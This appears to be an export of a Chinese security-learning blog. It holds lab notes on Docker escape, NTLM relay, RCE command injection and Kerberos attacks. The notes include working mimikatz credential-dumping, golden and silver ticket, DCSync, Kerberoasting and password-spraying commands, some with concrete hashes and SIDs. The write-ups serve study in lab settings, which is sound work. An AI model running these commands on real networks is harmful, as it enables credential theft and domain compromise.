<p>提权然后运行程序</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">ls</span><br><span class="line">chmod 777 main</span><br><span class="line">./main</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20231011111252556.png"
                      alt="image-20231011111252556"
                ></p>
<p>这时管理员进入这个docker之后这边exp就会被执行</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20231011112132369.png"
                      alt="image-20231011112132369"
                ></p>
<p>但是我这边好像没有执行反弹命令，应该是我的mian.go配置有问题不然就是编译出错了</p>
<p>正常来说到这一步是可以收到shell的</p>
<p>思路是没错的，操作问题，有时间再复现一遍</p>
]]></content>
  </entry>
  <entry>
    <title>NTLM中继</title>
    <url>/2024/02/29/NTLM%E4%B8%AD%E7%BB%A7/</url>
    <content><![CDATA[<h1 id="NTLM中继"><a href="#NTLM中继" class="headerlink" title="NTLM中继"></a>NTLM中继</h1><p>NTLM中继是指通过在NTLM认证过程中设置中间人，在客户端和服务端中传递认证消息，截获客户端的请求将其重放到吗，目标服务器中，实现了不需要密码即可获得访问相关资源的权限</p>
<h2 id="NTLM协议"><a href="#NTLM协议" class="headerlink" title="NTLM协议"></a>NTLM协议</h2><p>在这之前必须先了解NTLM协议是什么东西</p>
<p>NTLM是一套Windows安全协议，是为用户提供具有完整性和机密性的身份验证。</p>
<p>它是一种基于质询和应答的认证模式，在验证过程中不会通过网络明文传输用户密码信息</p>
<p>NTLM验证机制存在一套自己的加密算法，被称为NTLM Hash，用于用户明文密码的加密，实际上这个加密算法是基于MD4的，系统会将用户的明文密码加密生成一串hash值</p>
<p>这个hash值计算机本地用户会存在SAM文件中，域用户的信息则会存在于域控的NTDS.dit文件中。</p>
<p>认证过程会将用户输入的明文密码加密成NTLM Hash值，然后再与预存的值进行比对，达到认证的目的</p>
<p>在NTLM之前是有一个叫LM的机密算法，但是由于自身的安全性不太高就被淘汰了，逐渐由NTLM Hash替代</p>
<p>版本中有NTLM v1   v2     v2 session三个版本，但是使用最多的还是v2版本</p>
<h2 id="NTLM认证机制"><a href="#NTLM认证机制" class="headerlink" title="NTLM认证机制"></a>NTLM认证机制</h2><p>前面已经说过了NTLM是采用质询&#x2F;应答的认证模式</p>
<p>所以在认证的过程中有三个步骤协商、质询、身份验证</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">客户端----协商-----&gt;服务端</span><br><span class="line">客户端&lt;----质询----服务端</span><br><span class="line">客户端--身份验证---&gt;服务端</span><br></pre></td></tr></table></figure></div>

<p>这三个步骤之后就可以建立连接为客户端提供服务</p>
<h3 id="具体过程"><a href="#具体过程" class="headerlink" title="具体过程"></a>具体过程</h3><p>1.当客户端要访问服务端的某个服务时，需要输入服务端的账号和密码进行验证，此时此时客户端就会在本地缓存一份服务器密码的NTLM Hash，然后向服务器发送“协商”消息，该消息中包含一个以明文表示的用户名以及其他协商信息。</p>
<p>2.服务器收到客户端发送的消息之后，先判断本地账户中是否有这个用户名。如果有，服务器就会选出自己能够支持的提供的服务，生成并回复“质询”消息，该消息中包含了一个由服务端生成的16位随机值challenge，服务器也会在本地缓存该值。</p>
<p>3.客户端收到消息之后们就会使用刚才缓存的服务器的HTLM Hash对收到的challenge进行加密并生成response，然后将response、用户名和challenge等组合得到Net-NTLM Hash，然后将这个值封装到“身份验证”消息中发送出去</p>
<p>4.服务端也会将这个challenge用自己的NTLM Hash在本地加密一遍生成response，和收到的上一步的客户端发来的消息中的response进行比对，一致则验证通过</p>
<h3 id="域环境中的认证"><a href="#域环境中的认证" class="headerlink" title="域环境中的认证"></a>域环境中的认证</h3><p>在域环境中其实都差不多，只不过在后面的步骤中是由域控代表认证的，在第3步，域内用户是无法加密生成response，所以收到客户端发来的消息时服务端会将这个消息发送给域控，域控负责进行加密处理比对response，一致的话就会告诉服务端，然后服务端就会与这个域内客户端进行通信</p>
]]></content>
  </entry>
  <entry>
    <title>RCE漏洞</title>
    <url>/2023/03/08/RCE%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h1 id=""><a href="#" class="headerlink" title=""></a></h1><p>在web应用终，有些程序员为了考虑到灵活性、简洁性，会用代码调用代码或者命令执行函数去处理。如当应用在调用一些能将字符串转化成代码的函数的时候，没有考虑用户是否能构造攻击代码，或者待用系统命令处理，造成漏洞</p>
<p>如果网站不具有调用系统功能或者只是具有浏览的功能，一般不具有命令执行或代码执行漏洞</p>
<h2 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h2><p>执行脚本代码</p>
<p>eval（）的作用是将传递过来的字符串当作代码来执行</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221115140839667.png"
                      alt="image-20221115140839667"
                ></p>
<p>本来是代码执行但是如果加了echo&#96;&#96;之后就会变成命令执行，仅支持linux</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221115151756723.png"
                      alt="image-20221115151756723"
                ></p>
<p>例子：白盒测试</p>
<p>打开靶场，发现代码但是加密了，转到在线php执行进行显示解密</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221115152343831.png"
                      alt="image-20221115152343831"
                ></p>
<p>解密结果echo<code>$_REQUEST[a]</code>;;?&gt;</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="C:\Users\hc\AppData\Roaming\Typora\typora-user-images\image-20221115152516888.png"
                      alt="image-20221115152516888" style="zoom:150%;" 
                >

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221115152651166.png"
                      alt="image-20221115152651166"
                ></p>
<p>说明可以传输a这个值，发现key</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221115152812618.png"
                      alt="image-20221115152812618"
                ></p>
<p>查看key，解决！！！</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221115152859228.png"
                      alt="image-20221115152859228"
                ></p>
<h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><p>执行系统命令：ipconfig  ls  dir   等等如?x&#x3D;ipconfig</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221115141516079.png"
                      alt="image-20221115141516079"
                ></p>
<p>例子：黑盒测试</p>
<p>靶场开启发现是执行ping命令的输入框，属于命令执行，所以应该是存在命令执行漏洞的</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221115143426979.png"
                      alt="image-20221115143426979"
                ></p>
<p>想到可以利用|字符将多个命令并在一起</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221115143514018.png"
                      alt="image-20221115143514018"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221115143545698.png"
                      alt="image-20221115143545698"
                ></p>
<p>执行后发现存在过滤</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221115143629368.png"
                      alt="image-20221115143629368"
                ></p>
<p>多点几次发现如下图片，说明是前端验证</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221115143725513.png"
                      alt="image-20221115143725513"
                ></p>
<p>查看代码发现前端具有检测代码</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221115143820671.png"
                      alt="image-20221115143820671"
                ></p>
<p>利用抓包改参数，抓包将127.0.0.1改为127.0.0.1|ls放掉数据包，发现绕过成功</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221115144024189.png"
                      alt="image-20221115144024189"
                ></p>
<p>黑盒公开漏洞靶场演示</p>
<p>打开靶场发现是webmin，搜索一下发现是linux系统管理程序</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221115153212760.png"
                      alt="image-20221115153212760"
                ></p>
<p>搜索漏洞</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221115153301448.png"
                      alt="image-20221115153301448"
                ></p>
<p>网上教程一步一步来就行</p>
]]></content>
  </entry>
  <entry>
    <title>Kerberos攻击</title>
    <url>/2023/04/14/Kerberos%E6%94%BB%E5%87%BB/</url>
    <content><![CDATA[<h1 id=""><a href="#" class="headerlink" title=""></a></h1><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230404104911790.png"
                      alt="image-20230404104911790"
                ></p>
<h2 id="AS-REQ-amp-AS-REP阶段攻击"><a href="#AS-REQ-amp-AS-REP阶段攻击" class="headerlink" title="AS_REQ&amp;AS_REP阶段攻击"></a>AS_REQ&amp;AS_REP阶段攻击</h2><h3 id="域内用户枚举"><a href="#域内用户枚举" class="headerlink" title="域内用户枚举"></a>域内用户枚举</h3><p>kerberos是一种认证协议，在第一阶段AS_REQ中当用户不存在时，返回包提示错误，用户存在时，密码正确，密码错误时返回包都不一样</p>
<p>利用这一点就可以枚举出域内用户</p>
<p>三种状态的错误代码分别为：</p>
<p>KRB5DC_ERR_PREAUTH_REQUIRED           需要额外的预认证（用户存在）<br>KRB5DC_ERR_CLIENT_REVOKED                  客户端凭证已被吊销（禁用 ）<br>KRB5DC_ERR_C_PRINCIPAL_UNKNOWN    在Kerberos数据库中找不到客户端（不存在）</p>
<h6 id="枚举工具的使用"><a href="#枚举工具的使用" class="headerlink" title="枚举工具的使用"></a>枚举工具的使用</h6><p>kerbrute</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">kerbrute_windows_amd64.exe userenum --dc 域控ip -d 域名 用户名字典.txt</span><br><span class="line">kerbrute_windows_amd64.exe userenum --dc 192.168.10.2 -d test.lab users.txt</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230404112100259.png"
                      alt="image-20230404112100259"
                ></p>
<h3 id="密码喷洒"><a href="#密码喷洒" class="headerlink" title="密码喷洒"></a>密码喷洒</h3><p>在常规的爆破中，一般都是用很多密码取碰撞一个账户，很容易导致账号被锁定，密码喷洒时用一个密码去碰撞很多的账号，这个能有效避免账号被锁定</p>
<h6 id="喷撒原理"><a href="#喷撒原理" class="headerlink" title="喷撒原理"></a>喷撒原理</h6><p>就是在确认用户存在过后就会发送一个AS_REQ请求去，密码正确就会返回一个AS_REP，否则返回</p>
<p>KRB5KDC_ERP_PREAUTH_FAILED</p>
<ol>
<li>kerbrute工具</li>
</ol>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">kerbrute_windows_amd64.exe passwordspray --dc 192.168.10.2 -d test.lab users.txt yuwin7.com（密码）</span><br></pre></td></tr></table></figure></div>

<ol start="2">
<li><p>ADPwdSpray.py</p>
<p>可以利用hash值进行喷洒</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">针对明文进行喷洒</span><br><span class="line">python2 ADPwdSpray.py 192.168.10.2 test.lab users.txt clearpassword 123.com(密码) tcp</span><br><span class="line"> </span><br><span class="line">针对哈希进行喷洒</span><br><span class="line">python2 ADPwdSpray.py 192.168.10.2 test.lab users.txt ntlmhash afffeba176210fad4628f0524bfe1942 udp</span><br></pre></td></tr></table></figure></div>


</li>
<li><p>DomainPasswordSpray.ps1</p>
</li>
</ol>
<p>该工具需要在powershell环境中使用，powershell4.0不可用</p>
<p>这个工具是利用LDAP从域中导出用户列表，然后去掉被锁定的用户，再用固定密码进行密码喷洒</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">自动从域中导出用户列表</span><br><span class="line">powershell -exec bypass</span><br><span class="line">Import-Module .\DomainPasswordSpray.ps1</span><br><span class="line">Invoke-DomainPasswordSpray -Password 密码</span><br><span class="line">指定用户列表，指定单个密码进行爆破</span><br><span class="line">Invoke-DomainPasswordSpray -Userlist users.txt -Domain test.lab -password yuwin2012.com（密码）</span><br><span class="line">指定用户、密码列表进行爆破，输出到特定文件中</span><br><span class="line"></span><br><span class="line">依次使用密码对账号进行匹配，简称喷洒</span><br><span class="line">Invoke-DomainPasswordSpray -Userlist users.txt -Domain test.lab -PasswordList pass.txt</span><br></pre></td></tr></table></figure></div>

<h3 id="AS-REP-Roasting攻击"><a href="#AS-REP-Roasting攻击" class="headerlink" title="AS_REP Roasting攻击"></a>AS_REP Roasting攻击</h3><p>AS_REP Roasting攻击是一种对用户账号进行离线爆破的攻击方式。</p>
<p>比较局限，需要勾选“不需要kerberos预身份验证“，默认不勾选</p>
<p>这个选项是第一步（AS_REQ&amp;AS_REP），主要是防止密码脱机爆破</p>
<p>如果关闭之后</p>
<p>就可以使域控不会作任何反应就会将TGT票据和加密hash的session Key 返回，就可以离线破解得到明文密码</p>
<h3 id="黄金票据攻击"><a href="#黄金票据攻击" class="headerlink" title="黄金票据攻击"></a>黄金票据攻击</h3><p>在Keerberos认证协议中，所有用户的票据都是由krbtgt的NTLM哈希值加密的来的</p>
<p>只要获取krbtgt的值就可以伪造任意用户的票据</p>
<p>这种方式就叫做黄金票据攻击</p>
<p>需要 域名、域sid、krbtgt哈希值、伪造的用户，这些信息（域控）</p>
<p><code>whoami /user</code>获取域的sid值</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230405165843784.png"
                      alt="image-20230405165843784"
                ></p>
<p><code>net config workstation</code>查看所处域</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230405165952637.png"
                      alt="image-20230405165952637"
                ></p>
<p>获取krbtgt用户的hash</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz</span><br><span class="line">privilege::debug   提权</span><br><span class="line">lsadump::lsa /patch   获取krbtgt用户的hash，域的sid值</span><br><span class="line">lsadum::lsa /patch /user:krbtgt</span><br></pre></td></tr></table></figure></div>

<p>不知道为什么krbtgt的NTLM值读不出来</p>
<p>3240a50b789addc29388d03988e89209</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230405170743855.png"
                      alt="image-20230405170743855"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230405113131030.png"
                      alt="image-20230405113131030"
                ></p>
<p>然后利用得到的hash值，利用mimikatz生成黄金票据并导入（在其他域内机子中输入）</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">清除票据</span><br><span class="line">Kerberos::purge</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">kerberos::golden /admin:Administrator /domain:hack-my.com /sid:S-1-5-21-3694414171-540705576-2292004015 /krbtgt:3240a50b789addc29388d03988e89209 /ticket:ticket.kirbi</span><br><span class="line"></span><br><span class="line">kerberos::golden /admin:Administrator /domain:hack-my.com /sid:域控sid /krbtgt:NTLM值（3240a50b789addc29388d03988e89209） /ticket:ticket.kirbi</span><br><span class="line"></span><br><span class="line">kerberos::ptt ticket.kirbi</span><br><span class="line"></span><br><span class="line">连接共享</span><br><span class="line">dir \\ip\c$</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230406141213924.png"
                      alt="image-20230406141213924"
                ></p>
<p>拒绝访问，不知道为啥</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230406141242727.png"
                      alt="image-20230406141242727"
                ></p>
<h2 id="TGS-REQ-amp-TGS-REP阶段攻击"><a href="#TGS-REQ-amp-TGS-REP阶段攻击" class="headerlink" title="TGS_REQ&amp;TGS_REP阶段攻击"></a>TGS_REQ&amp;TGS_REP阶段攻击</h2><h3 id="Kerberosast攻击"><a href="#Kerberosast攻击" class="headerlink" title="Kerberosast攻击"></a>Kerberosast攻击</h3><h6 id="前瞻知识"><a href="#前瞻知识" class="headerlink" title="前瞻知识"></a>前瞻知识</h6><p>SPN，是服务实例（http、mssql、mysql等服务）的唯一标识符</p>
<p>kerberos认证过程是使用SPN将服务实例与服务登录账户相关联</p>
<p>如果想使用Kerberos认证服务，必须正确的配置SPN</p>
<p>一个账户有多个SPN</p>
<h6 id="注册方式有两种："><a href="#注册方式有两种：" class="headerlink" title="注册方式有两种："></a>注册方式有两种：</h6><p>机器账户：一个服务的权限是Local System或者Network Service时，则SPN注册在机器账户下</p>
<p>域用户账户：当权限是一个域用户时，则SPN是注册在域用户账户下</p>
<p>注意攻击的是域用户</p>
<h6 id="判断指令"><a href="#判断指令" class="headerlink" title="判断指令"></a>判断指令</h6><p>域环境下执行<code>setspn -q */*</code></p>
<p>以CN开头的每一行代表一个帐户，其下的信息是与该帐户相关联的SPN,默认有三个：</p>
<p>域控制器：CN&#x3D;DC,OU&#x3D;Domain Controllers,DC&#x3D;laosec,DC&#x3D;cn</p>
<p>域用户帐户：CN&#x3D;krbtgt,CN&#x3D;Users,DC&#x3D;laosec,DC&#x3D;cn</p>
<p>机器帐户：CN&#x3D;WIN7,CN&#x3D;Computers,DC&#x3D;laosec,DC&#x3D;cn</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230405145700825.png"
                      alt="image-20230405145700825"
                ></p>
<h6 id="攻击过程"><a href="#攻击过程" class="headerlink" title="攻击过程"></a>攻击过程</h6><p>攻击者对一个域进行身份认证，然后获得TGT，用于之后的ST请求</p>
<p>攻击者使用TGT发出ST服务票据请求，获得特定形式的SPN，具有唯一性</p>
<p>ST服务票据以服务回复的形式发送回攻击者</p>
<p>攻击者从TGS_REP中提取加密的服务票证，利用离线破解就可以恢复明文密码</p>
<h6 id="攻击手段"><a href="#攻击手段" class="headerlink" title="攻击手段"></a>攻击手段</h6><p>使用mimikatz请求</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">kerberos::ask /target:SQLServer/mssql.hacker.lab:1433/MSSQL  请求服务票据</span><br><span class="line">Kerberos::list            列出服务票据</span><br><span class="line">l=kerberos::purge         清除所有票据</span><br><span class="line">kerberos::list /export    导出所有票据</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/2670873-20220816105758937-1080046002.png"
                      alt="img"
                ></p>
<p>导出票据</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230405152303985.png"
                      alt="image-20230405152303985"
                ></p>
<p>破解票据</p>
<p>使用kerberosast中的tgsrepcrack.py破解</p>
<p><code>python3 tgsrepcrack.py wordlist.txt test.kirbi</code></p>
<p>即可破解出明文密码</p>
<h3 id="白银票据攻击"><a href="#白银票据攻击" class="headerlink" title="白银票据攻击"></a>白银票据攻击</h3><p>可以说是为了找krbtgt的hash值，为后续黄金票据提供必要条件</p>
<p>黄金票据是伪造TGT，而白银票据是伪造ST</p>
<p>客户是带着ST，server对其进行认证，解密ST得到session key，key再解密就认证成功了，就允许访问服务了</p>
<p>所以我们能够明白，只要知道Server用户hash就可以伪造出一个ST，且不会经过KDC，这个票据只对部分服务有效</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">条件</span><br><span class="line">1.域名</span><br><span class="line">2.域sid</span><br><span class="line">3.目标服务器名</span><br><span class="line">4.可利用的服务</span><br><span class="line">5.服务账号的NTLM HASH</span><br><span class="line">6.需要伪造的用户名</span><br></pre></td></tr></table></figure></div>

<h6 id="基本信息获取（SID，所处域，服务器名，NTLM-HASH）-域控"><a href="#基本信息获取（SID，所处域，服务器名，NTLM-HASH）-域控" class="headerlink" title="基本信息获取（SID，所处域，服务器名，NTLM HASH）(域控)"></a>基本信息获取（SID，所处域，服务器名，NTLM HASH）(域控)</h6><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">SID和所处域参考上面</span><br><span class="line">whoami /user </span><br><span class="line">net config workstation</span><br><span class="line"></span><br><span class="line">获取服务账号hash</span><br><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonPasswords&quot; </span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230405154632357.png"
                      alt="image-20230405154632357"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230405154752324.png"
                      alt="image-20230405154752324"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230405154949583.png"
                      alt="image-20230405154949583"
                ></p>
<p>所有信息收集完全后就可以制作白银票据</p>
<p>先清除一下系统票据（域控）</p>
<p>klist purge</p>
<p>mimikatz</p>
<p>kerberos::purge</p>
<h6 id="伪造共享文件夹服务（cifs）权限，mimkatz-域内其他主机"><a href="#伪造共享文件夹服务（cifs）权限，mimkatz-域内其他主机" class="headerlink" title="伪造共享文件夹服务（cifs）权限，mimkatz(域内其他主机)"></a>伪造共享文件夹服务（cifs）权限，mimkatz(域内其他主机)</h6><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">klist purge  清除票据（cmd）</span><br><span class="line"></span><br><span class="line">kerberos::golden /domain:hack-my.com /sid:S-1-5-21-3694414171-540705576-2292004015 /target:dc.hack-my.com /service:cifs /rc4:509c91e48a75dab92d5ae7d888cebc8a /user:aaaa /ptt</span><br><span class="line"></span><br><span class="line">kerberos::golden /domain:域名 /sid:域sid /target:目标服务器 /service:目标服务 /rc4:目标服务器的hash /user:xxx用户名 /ptt</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230405160752134.png"
                      alt="image-20230405160752134"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230405160808470.png"
                      alt="image-20230405160808470"
                ></p>
<p>票据注入成功了，但是不知道为啥还是拒绝访问</p>
<h6 id="伪造LDAP服务权限"><a href="#伪造LDAP服务权限" class="headerlink" title="伪造LDAP服务权限"></a>伪造LDAP服务权限</h6><h6 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h6><p>制作一个票据（注意sid中要去掉末尾的-500），接下来就可以使用生成的票据进行攻击</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">kerberos::golden /domain:hack-my.com /sid:S-1-5-21-3694414171-540705576-2292004015 /target:dc.hack-my.com /service:ldap /rc4:509c91e48a75dab92d5ae7d888cebc8a /user:aaaa /ptt</span><br><span class="line"></span><br><span class="line">只需要把服务名改成/service:ldap即可</span><br><span class="line"></span><br><span class="line">参考:https://blog.csdn.net/weixin_39851261/article/details/112076055</span><br></pre></td></tr></table></figure></div>

<p>mimikatz使用</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">lsadump::dcsync /dc:dc.hack-my.com /domain:hack-my.com /user:krbtgt</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">lsadump::dcsync 向 DC 发起一个同步对象（可获取帐户的密码信息）的质询。 需要的权限包括管理员组（Administrators），域管理员组（ Domain Admins）或企业管理员组（Enterprise Admins）以及域控制器的计算机帐户 只读域控制器默认不允许读取用户密码数据</span><br></pre></td></tr></table></figure></div>

<p>按理说就可以获得krbtgt的值了，像这样</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230405165048733.png"
                      alt="image-20230405165048733"
                ></p>
<p>但是我的报错了，出不来，不知道是不是环境问题</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230405165127338.png"
                      alt="image-20230405165127338"
                ></p>
<p>第二天再试一次就可以了，奇奇怪怪的</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230406135943742.png"
                      alt="image-20230406135943742"
                ></p>
<p>获得krbtgt的hash值就可以进行黄金票据的构造了</p>
<h3 id="委派攻击"><a href="#委派攻击" class="headerlink" title="委派攻击"></a>委派攻击</h3><p>在现实情况下，多个服务往往不能在一台机器中</p>
<p>比如，用户在使用服务A时，需要服务B上的数据，最简单的方式就是A帮B去请求返回相应的信息</p>
<p>而这个过程就称之为委派</p>
<p>委派攻击分为：非约束委派、约束委派、基于资源三种</p>
<h4 id="非约束委派"><a href="#非约束委派" class="headerlink" title="非约束委派"></a>非约束委派</h4><p>当一个服务servicel开启非约束委派后，用户user访问servicel后，servicel就保存user的TGT票据，然后servicel就可以用user的身份来访问域中user可以访问所有服务</p>
<p>如果域管理员访问了一个开启非约束委派的服务，那这个服务就会将域管理员的TGT保存在内存中，这样就可以获得域管理员权限了</p>
<p>实验环境：win2008 域内机器  win2012域控</p>
<p>win2008的Alice用户是普通域内机器，默认没开启委派</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230406112617697.png"
                      alt="image-20230406112617697"
                ></p>
<p>接下来就要开启委派了，给域用户注册SPN</p>
<p>域控主机上执行</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">setspn -U -A priv/test Alice</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230406112814369.png"
                      alt="image-20230406112814369"
                ></p>
<p>然后查看Alice，发现多了个委派，设置为非约束委派</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230406113052810.png"
                      alt="image-20230406113052810"
                ></p>
<p>查询域内设置了非约束委派的服务账户</p>
<p>Alice上执行</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">AdFind.exe -b &quot;DC=hack-my,DC=com&quot; -f &quot;(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; dn</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230406115059827.png"
                      alt="image-20230406115059827"
                ></p>
<p>查询域内设置了非约束委派的机器账户</p>
<p>执行</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">AdFind.exe -b &quot;DC=hack-my,DC=com&quot; -f &quot;(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; dn</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230406115348386.png"
                      alt="image-20230406115348386"
                ></p>
<h6 id="接下来开始攻击-利用1"><a href="#接下来开始攻击-利用1" class="headerlink" title="接下来开始攻击  利用1"></a>接下来开始攻击  利用1</h6><p>可以让域管理员访问被控主机</p>
<p>前提：找到配置了非约束委派的机器Alice并获得了管理员权限</p>
<p>Alice的mimikatz执行，查看本地票据，导出，没有administrator</p>
